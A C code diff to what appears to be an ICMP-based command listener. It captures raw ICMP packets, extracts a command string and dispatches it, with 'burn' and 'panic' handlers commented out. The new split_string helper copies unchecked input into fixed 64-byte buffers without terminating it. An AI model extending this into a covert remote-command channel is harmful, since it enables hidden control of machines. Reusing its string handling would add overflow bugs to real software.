@@ -79,8 +79,57 @@ int get_cmd(char *payload, char *output, int size) {
     return 0;
 }
 
+void split_string(char *m, char **s1, char **s2) {
+
+    int l = strlen(m);
+    *s1 = (char *) malloc(64);
+    *s2 = (char *) malloc(64);
+
+    if (strstr(m," ") == NULL) {
+        strncpy(*s1, m, l);
+        free(*s2); *s2 = NULL;
+        return;
+    }
+
+    for (int i=0; i<l; i++)
+        if (m[i] == ' ') {
+            (*s1)[i] = 0x00;
+            break;
+        } else
+            (*s1)[i] = m[i];
+
+    strncpy(*s2,&strstr(m, " ")[1],strlen(&strstr(m, " ")[1]));
+
+    if (strlen(*s1) < 1) {
+        free(*s1); *s1 = NULL;
+        free(*s2); *s2 = NULL;
+    } else if (strlen(*s2) < 1) {
+        free(*s2); *s2 = NULL;
+    }
+
+    return;
+}
 
 int process_cmd(char *cmd) {
+
+    char *arg1;
+    char *arg2;
+
+    split_string(cmd, &arg1, &arg2);
+
+    if (arg1 != NULL) {
+        printf("%s\n", arg1);
+    } else {
+        printf("error\n");
+    }
+
+    if (arg2 != NULL) {
+        printf("%s\n", arg2);
+    } else {
+        printf("error\n");
+    }
+
+    /*
     if (strcmp(cmd, "burn") == 0) {
         printf("Burning...\n");
         //burn();
@@ -91,6 +140,7 @@ int process_cmd(char *cmd) {
         printf("Panicking...\n");
         //crash();
     }
+    */
 }
 
 int process_icmp(unsigned char* buffer , int size, char *ip_src, char *ip_dst, char *msg) {
@@ -161,11 +211,9 @@ int main()
     int s;
     //char *ip_src, *ip_dst, *msg;
      
-    unsigned char *buffer = (unsigned char *)malloc(128);                   // icmp packet size, usually 98
-    char *ip_src = (char *) malloc(16);
-    char *ip_dst = (char *) malloc(16);
-    char *msg = malloc(64);
-    char *cmd = malloc(64);
+    char *buffer = malloc(128);                   // icmp packet size, usually 98
+    char ip_src[16], ip_dst[16];
+    char msg[64], cmd[64];
 
     s = socket(AF_INET , SOCK_RAW , IPPROTO_ICMP);                          // raw socket, ICMP only (TCP, UDP, RAW)
     if(s < 0) { printf("Cannot create socket\n"); return 1; }
@@ -185,7 +233,9 @@ int main()
                 printf("Package captured!\n");
                 printf("From %s, to %s\n", ip_src, ip_dst);
                 printf("Command: %s\n", cmd);
+                process_cmd(cmd);
             }
+
         }
         else
             continue;
